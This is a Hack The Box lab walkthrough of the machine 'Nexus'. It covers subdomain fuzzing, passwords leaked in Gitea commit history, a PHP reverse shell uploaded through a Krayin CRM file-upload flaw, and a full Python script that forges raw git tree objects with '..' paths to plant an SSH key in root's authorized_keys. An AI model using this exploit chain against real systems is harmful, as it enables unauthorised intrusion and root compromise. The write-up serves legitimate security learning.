---
title: "HTB: Nexus"
date: 2026-09-17
draft: false
categories: ["HTB Labs"]
tags: ["htb", "writeup", "linux", "gitea", "krayin", "file-upload", "directory-traversal", "cve-2026-38526"]
description: "Walkthrough of the Hack The Box machine Nexus — a Gitea repo leaks CRM credentials via commit history, CVE-2026-38526 in Krayin CRM gives a shell, and an unsanitized os.path.join() in a Gitea template sync service is abused with raw git object injection to write root's authorized_keys."
ShowToc: true
TocOpen: false
---

**Difficulty:** Easy · **OS:** Linux

**Table of Contents**

- [Intro](#intro)
- [Recon](#recon)
- [Enumerating the web app](#enumerating-the-web-app)
- [VHost fuzzing — finding hidden services](#vhost-fuzzing--finding-hidden-services)
- [Gitea — credentials in commit history](#gitea--credentials-in-commit-history)
- [Krayin CRM — CVE-2026-38526](#krayin-crm--cve-2026-38526)
- [Getting a shell](#getting-a-shell)
- [Finding credentials on disk](#finding-credentials-on-disk)
- [Privilege escalation — Gitea template directory traversal](#privilege-escalation--gitea-template-directory-traversal)
- [Takeaways](#takeaways)
- [Conclusion](#conclusion)

---

## Intro

This is the third box I've worked through, and the first one I went into completely blind — no guided format, no hints, just the machine. Nexus is rated Easy but it had more moving parts than Cap or Facts: subdomain fuzzing, digging through Git commit history for leaked creds, exploiting a file upload CVE in a CRM, and a privilege escalation that I genuinely had to think through. The privesc especially taught me something I hadn't seen before — abusing Python's `os.path.join()` with raw Git object injection to write files outside an intended directory. I'll break it all down.

---

## Recon

Started with an nmap scan to see what's running:

```text
┌──(d3vilsec㉿kali)-[~]
└─$ nmap -sC -sV -p- 10.129.85.255
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two ports — SSH and nginx on 80. The HTTP title tells me it's redirecting to `nexus.htb`, so I added it to `/etc/hosts`:

```text
echo "10.129.85.255 nexus.htb" | sudo tee -a /etc/hosts
```

> **Tip:** Always use `-a` with `tee` or you'll overwrite your entire `/etc/hosts`. Ask me how I know. 😅

---

## Enumerating the web app

Visiting `nexus.htb` shows a government energy authority site — the Nexus Energy Authority. Not a lot of obvious attack surface on the surface, but digging into the **Careers** section reveals a job posting that leaks two email addresses:

- `careers@nexus.htb`
- `j.matthew@nexus.htb` ← hiring manager contact

![Hiring manager email leaked in job posting](hiring_email_address.png)

That hiring manager email is worth holding onto.

---

## VHost fuzzing — finding hidden services

With a custom domain like `nexus.htb`, there could be other services running on different subdomains behind the same IP. The way to find them is to fuzz the `Host` header — you're sending requests to the same IP every time but swapping in different subdomain values to see what nginx routes differently.

First run to see the baseline:

```text
┌──(d3vilsec㉿kali)-[~]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
     -u http://nexus.htb/ \
     -H "Host: FUZZ.nexus.htb"
```

This comes back with thousands of results — every entry returns `Status: 302, Size: 154, Words: 4`. That's nginx serving its default catch-all page for any `Host` header it doesn't recognize. Total noise.

The fix: filter out anything matching that word count with `-fw 4`. I also considered filtering by status code (`-fc 302`), but that's riskier — a real vhost running a login page might also return a 302, and you'd filter it out along with the noise. Word count is a more specific fingerprint.

```text
┌──(d3vilsec㉿kali)-[~]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
     -u http://nexus.htb/ \
     -H "Host: FUZZ.nexus.htb" \
     -fw 4

git     [Status: 200, Size: 14879, Words: 1254, Lines: 247]
billing [Status: 302, Size: 390,   Words: 60,   Lines: 12]
```

Two hits. Added both to `/etc/hosts` and went to look at them:

- `git.nexus.htb` — a **Gitea** instance (self-hosted Git)
- `billing.nexus.htb` — a **Krayin CRM** login page

---

## Gitea — credentials in commit history

Browsing Gitea without logging in, I found a public repo: `admin/krayin-docker-setup`. It contains a `.env` file — but the `DB_PASSWORD` field is blank in the current version.

The key thing to check here is the **commit history**. Someone committed the password and later tried to scrub it, but Git preserves every version of every file forever unless the history is explicitly rewritten and force-pushed. In this case, they just removed it in a new commit — which means the old commit still has it:

```text
DB_PASSWORD=N27xh!!2ucY04
```

![Gitea commit history showing the removed DB_PASSWORD](gitea_DB_PASSWORD.png)

Git never forgets. This is a very common real-world mistake.

---

## Krayin CRM — CVE-2026-38526

`billing.nexus.htb` is running **Krayin CRM**. Logging in with the email from the job posting and the password from the Git history:

- Email: `j.matthew@nexus.htb`
- Password: `N27xh!!2ucY04`

Version shows **2.2.0**. Searching for known vulnerabilities turns up **CVE-2026-38526** — an authenticated arbitrary file upload via the TinyMCE editor endpoint (`/admin/tinymce/upload`). The app is supposed to only allow image uploads, but it doesn't enforce the file extension server-side.

---

## Getting a shell

Grabbed PentestMonkey's PHP reverse shell and edited the IP and port:

```php
$ip = '10.10.14.201';  // tun0 IP
$port = 4444;
```

In Krayin, navigated to **Mail → Compose** and used the TinyMCE file attachment button to upload `php-reverse-shell.php` directly — no extension bypass needed, the server accepts it as-is.

Used **Burp Suite** to read the JSON response from the upload, which gives back the URL where the file was stored:

![Burp Suite response showing the uploaded shell URL](php_upload_url_location.png)

Started a listener and triggered the shell:

```text
┌──(d3vilsec㉿kali)-[~]
└─$ nc -lnvp 4444
```

```text
┌──(d3vilsec㉿kali)-[~]
└─$ wget -qO- http://billing.nexus.htb/storage/emails/2/php-reverse-shell.php
```

> The number in the path (`/emails/2/`) corresponds to the upload count — check the Burp response for the exact URL.

Shell came back as `www-data`. Stabilized it:

```text
$ script /dev/null -c /bin/bash
www-data@nexus:/$
```

---

## Finding credentials on disk

Enumerated the Krayin application directory and found a second set of credentials in the live `.env` file — different from the one in the Git history:

```text
www-data@nexus:~/krayin$ cat .env
APP_NAME="Krayin CRM"
APP_ENV=local
APP_KEY=base64:n4swv+4YcBtCr1OPHBe69GxK06/X1y1vCQU1SIMIC7Q=
APP_DEBUG=true
APP_URL=http://billing.nexus.htb
...
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
...
```

Checked `/etc/passwd` for real users:

```text
www-data@nexus:~/krayin$ cat /etc/passwd | grep bash
jones:x:1000:1000:,,,:/home/jones:/bin/bash
git:x:111:112:Git Version Control,,,:/home/git:/bin/bash
```

Two users — `jones` and `git`. Tried the DB password for SSH as jones — password reuse is one of the most reliable things in CTFs and real pentests:

```text
┌──(d3vilsec㉿kali)-[~]
└─$ ssh jones@nexus.htb
jones@nexus.htb's password: y27xb3ha!!74GbR

jones@nexus:~$ cat user.txt
[REDACTED]
```

User flag down.

---

## Privilege escalation — Gitea template directory traversal

Running linpeas flagged something immediately:

```text
Potential privilege escalation in timer file: /etc/systemd/system/gitea-template-sync.timer
Potential privilege escalation in timer file: /etc/systemd/system/timers.target.wants/gitea-template-sync.timer
```

When linpeas flags the same thing twice, pay attention. Checking the service:

```text
jones@nexus:~$ systemctl status gitea-template-sync.service
○ gitea-template-sync.service - Sync Gitea templates
     Loaded: loaded (/etc/systemd/system/gitea-template-sync.service; static)
     Active: inactive (dead) since Thu 2026-09-17 19:21:24 UTC; 46s ago
TriggeredBy: ● gitea-template-sync.timer
    Process: 2972 ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py (code=exited, status=0/SUCCESS)
   Main PID: 2972 (code=exited, status=0/SUCCESS)
        CPU: 197ms
```

It's running a Python script as root every minute. Reading the script reveals the vulnerability:

```python
# filepath comes directly from git ls-tree — never sanitized
result = subprocess.run(
    ['git', '-c', 'safe.directory=*', 'ls-tree', '-r', 'HEAD'],
    cwd=bare_path, capture_output=True, text=True, timeout=10
)

for line in result.stdout.strip().split('\n'):
    meta, filepath = line.split('\t', 1)   # raw filepath from git ls-tree
    ...
    target = os.path.join(stage_path, filepath)   # NO sanitization!
    os.makedirs(os.path.dirname(target), exist_ok=True)

    with open(target, 'wb') as f:
        f.write(cat_result.stdout)
```

`filepath` is pulled raw from `git ls-tree` and passed straight into `os.path.join()`. In Python, `os.path.join()` resolves `..` components without any validation — so if a file path in the repo contains `..`, it walks outside the intended staging directory.

The staging directory is `/home/git/template-staging/jones/rce/`. To reach `/root/.ssh/authorized_keys` from there requires 5 levels of `..`:

```text
/home/git/template-staging/jones/rce/
..  → /home/git/template-staging/jones/
..  → /home/git/template-staging/
..  → /home/git/
..  → /home/
..  → /
```

Then append `root/.ssh/authorized_keys` — giving the traversal path `../../../../../root/.ssh/authorized_keys`.

**The problem:** Git's built-in `verify_path()` check blocks `..` in file paths when you run `git add`, so you can't create this path through normal Git commands.

**The bypass:** Write raw Git objects directly to `.git/objects/`, which skips `verify_path()` entirely. Git stores everything as compressed objects — blobs (file contents), trees (directory listings), and commits. If you construct those objects manually and write them straight to `.git/objects/`, Git never validates the paths they contain.

**Step 1 — Generate an SSH key pair:**

```text
┌──(d3vilsec㉿kali)-[~]
└─$ ssh-keygen -t ed25519 -f /tmp/.k -N ''
```

**Step 2 — Transfer the public key to the target and create a template repo in Gitea:**

Log into `git.nexus.htb` as jones, create a repo called `rce`, and tick **"Make repository a template"** — the sync service only processes template repos.

```text
jones@nexus:~$ cd /tmp
jones@nexus:/tmp$ git clone http://jones:'y27xb3ha!!74GbR'@127.0.0.1:3000/jones/rce.git
jones@nexus:/tmp$ cd rce && touch README.md
```

**Step 3 — Build the traversal payload with a Python script:**

```python
# build.py — creates raw git objects with .. path traversal
#!/usr/bin/env python3
import hashlib, zlib, os, subprocess, sys, time

def write_obj(data, t):
    h = ("%s %d" % (t, len(data))).encode() + b"\x00"
    s = h + data
    sha = hashlib.sha1(s).hexdigest()
    d = os.path.join(".git", "objects", sha[:2])
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, sha[2:])
    if not os.path.exists(p):
        open(p, "wb").write(zlib.compress(s))
    return sha

def entry(mode, name, sha):
    return ("%s %s" % (mode, name)).encode() + b"\x00" + bytes.fromhex(sha)

r = subprocess.run(["cat", "/tmp/.k.pub"], capture_output=True, text=True)
key = r.stdout.strip() + "\n"

blob    = write_obj(key.encode(), "blob")
readme  = write_obj(b"# Template\n", "blob")
ssh_t   = write_obj(entry("100644", "authorized_keys", blob), "tree")
cur     = write_obj(entry("40000", ".ssh", ssh_t), "tree")
fir     = write_obj(entry("40000", "root", cur), "tree")

# Build 4 levels of ".." trees (the root tree adds the 5th)
for i in range(4):
    fir = write_obj(entry("40000", "..", fir), "tree")

root = write_obj(entry("100644", "README.md", readme) + entry("40000", "..", fir), "tree")
ts = int(time.time())
c = "tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n" % (root, ts, ts)
sha = write_obj(c.encode(), "commit")
os.makedirs(os.path.join(".git", "refs", "heads"), exist_ok=True)
open(os.path.join(".git", "refs", "heads", "main"), "w").write(sha + "\n")
print("Done: " + sha)
```

The loop builds a chain of `..` tree objects. 4 from the loop plus 1 from the root tree = 5 total, getting us from the staging directory all the way to `/`. Think of it as `cd ..` five times.

```text
jones@nexus:/tmp/rce$ python3 /tmp/build.py
Done: ddbd2e635fd92328a68765592cb2008af4397fa0

jones@nexus:/tmp/rce$ git push http://jones:'y27xb3ha!!74GbR'@127.0.0.1:3000/jones/rce.git main --force
```

**Step 4 — Wait for the timer and confirm:**

```text
jones@nexus:~$ cat /var/log/template-sync.log
[2026-09-17 19:21:24] Template sync starting
[2026-09-17 19:21:24] Found 2 template repo(s)
[2026-09-17 19:21:24] Syncing template: jones/rce
[2026-09-17 19:21:24]   synced: README.md
[2026-09-17 19:21:24]   synced: ../../../../../root/.ssh/authorized_keys
[2026-09-17 19:21:24] Template sync complete
```

The sync service resolved the traversal and wrote our public key to `/root/.ssh/authorized_keys`.

**Step 5 — SSH in as root:**

```text
┌──(d3vilsec㉿kali)-[~]
└─$ ssh -i /tmp/.k root@nexus.htb

root@nexus:~# cat /root/root.txt
[REDACTED]
```

---

## Takeaways

- **Git history never lies.** The current state of a file means nothing — always check commit history. Secrets committed and then "removed" in a later commit are still fully recoverable forever.
- **Password reuse is reliable.** Credentials found in config files on disk are worth trying against SSH, regardless of what service they were originally for.
- **`os.path.join()` in Python doesn't sanitize `..`.** Any script that feeds unsanitized user-controlled paths into `os.path.join()` is potentially vulnerable to directory traversal. This is the kind of bug that shows up in real code reviews.
- **Git's `verify_path()` can be bypassed** by writing raw objects directly to `.git/objects/`. Normal `git add` validates paths — raw object writes do not.
- **Word count filtering in ffuf (`-fw`) is more reliable than status code filtering (`-fc`)** when dealing with vhost fuzzing. A legitimate vhost behind a login redirect returns the same 302 as a catch-all — but with a completely different response body.

---

## Conclusion

Nexus was a big step up for me compared to Cap and Facts — not because any single step was harder, but because I had to chain more things together without any guidance. Going in blind meant I had to make my own decisions about what to look at and in what order, and I made some wrong turns along the way (including nearly wiping `/etc/hosts` on the first command 😅).

The privesc is genuinely the most technically interesting thing I've done so far. The concept of directory traversal wasn't new to me, but seeing it applied inside a Git tree object — and having to bypass Git's own path validation to pull it off — was something I hadn't encountered before. The `build.py` script goes in my toolkit.

A couple of things I want to keep building on: getting faster with Burp Suite (still slow to navigate), and getting more comfortable reading Python code so I can spot things like the `os.path.join()` pattern faster when reviewing scripts.

On to the next one.

---

*Tags: htb, writeup, linux, gitea, krayin-crm, file-upload, directory-traversal, cve-2026-38526*
